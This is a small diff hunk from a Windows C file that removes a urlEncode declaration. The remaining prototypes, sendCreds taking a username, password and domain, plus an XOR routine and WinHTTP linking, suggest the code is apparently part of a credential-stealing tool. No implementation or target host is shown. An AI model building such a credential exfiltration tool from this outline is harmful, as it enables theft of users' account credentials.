@@ -7,7 +7,6 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-wchar_t* urlEncode(const wchar_t*);
 BOOL sendCreds(LPWSTR username, LPWSTR password, LPWSTR domain);
 void xorWithKey(BYTE*, size_t, BYTE*, size_t);
 char* wcharToChar(const wchar_t*);
